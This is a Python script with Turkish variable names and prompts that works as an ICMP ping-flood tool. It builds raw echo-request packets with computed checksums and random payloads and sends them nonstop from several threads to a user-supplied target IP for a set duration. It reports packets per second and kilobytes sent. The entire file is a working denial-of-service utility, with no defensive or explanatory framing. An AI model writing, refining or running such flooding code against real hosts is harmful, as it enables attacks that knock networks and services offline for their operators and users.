import socket
import struct
import os
import base64
import threading
import time
import sys

def toplam_kontrol(veri):
    toplam = 0
    kontrol_sinir = (len(veri) // 2) * 2

    for i in range(0, kontrol_sinir, 2):
        deger = veri[i] + (veri[i + 1] << 8)
        toplam = toplam + deger
        toplam = toplam & 0xffffffff

    if kontrol_sinir < len(veri):
        toplam = toplam + veri[-1]
        toplam = toplam & 0xffffffff

    toplam = (toplam >> 16) + (toplam & 0xffff)
    toplam = toplam + (toplam >> 16)
    sonuc = ~toplam
    sonuc = sonuc & 0xffff
    sonuc = sonuc >> 8 | (sonuc << 8 & 0xff00)
    return sonuc

def rastgele_base64_verisi(uzunluk):
    rastgele_veri = os.urandom(uzunluk)
    base64_kodlu = base64.b64encode(rastgele_veri)
    return base64_kodlu[:uzunluk]

def icmp_paketi_olustur(sira_no, veri_boyutu):
    icmp_turu = 8
    icmp_kodu = 0
    icmp_kontrol = 0
    kimlik = os.getpid() & 0xFFFF

    baslik = struct.pack("!BBHHH", icmp_turu, icmp_kodu, icmp_kontrol, kimlik, sira_no)
    veri = rastgele_base64_verisi(veri_boyutu)

    icmp_kontrol = toplam_kontrol(baslik + veri)
    baslik = struct.pack("!BBHHH", icmp_turu, icmp_kodu, icmp_kontrol, kimlik, sira_no)

    return baslik + veri

def icmp_gonder(hedef_ip, veri_boyutu, bitis_zamani, istatistik):
    try:
        soket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except PermissionError:
        print("Hata: ICMP paketleri göndermek için root/admin yetkisi gereklidir.")
        return

    while time.time() < bitis_zamani:
        paket = icmp_paketi_olustur(os.getpid(), veri_boyutu)
        soket.sendto(paket, (hedef_ip, 0))
        istatistik["gonderilen_paket"] += 1
        istatistik["gonderilen_byte"] += len(paket)

def ping_gonder(hedef_ip, veri_boyutu, is_parcasi_sayisi, sure):
    bitis_zamani = time.time() + sure
    print(f"{hedef_ip} adresine {is_parcasi_sayisi} iş parçacığı ile {sure} saniye boyunca ICMP paketleri gönderiliyor...\n")

    istatistik = {"gonderilen_paket": 0, "gonderilen_byte": 0}

    is_parcalari = []
    for _ in range(is_parcasi_sayisi):
        is_parcasi = threading.Thread(target=icmp_gonder, args=(hedef_ip, veri_boyutu, bitis_zamani, istatistik))
        is_parcasi.start()
        is_parcalari.append(is_parcasi)

    baslangic_zamani = time.time()

    while time.time() < bitis_zamani:
        gecen_zaman = time.time() - baslangic_zamani
        kalan_zaman = bitis_zamani - time.time()

        gonderilen_paket = istatistik["gonderilen_paket"]
        gonderilen_byte = istatistik["gonderilen_byte"]
        kb_gonderilen = gonderilen_byte / 1024
        paket_saniye = gonderilen_paket / gecen_zaman if gecen_zaman > 0 else 0
        kb_saniye = kb_gonderilen / gecen_zaman if gecen_zaman > 0 else 0

        sys.stdout.write(f"\rKalan süre: {int(kalan_zaman)} sn | Paket / Saniye: {int(paket_saniye)} | Toplam veri transferi: {int(kb_gonderilen)} KB")
        sys.stdout.flush()
        time.sleep(1)

    for is_parcasi in is_parcalari:
        is_parcasi.join()

    print("\nSüre doldu, tüm ICMP paketleri gönderildi.")

if __name__ == "__main__":
    hedef = input("Hedef IP: ")
    veri_boyutu = int(input("Veri boyutu (byte): "))
    is_parcasi_sayisi = int(input("Kaç iş parçacığı kullanılacak?: "))
    sure = int(input("Kaç saniye boyunca gönderim yapılsın?: "))

    ping_gonder(hedef, veri_boyutu, is_parcasi_sayisi, sure)
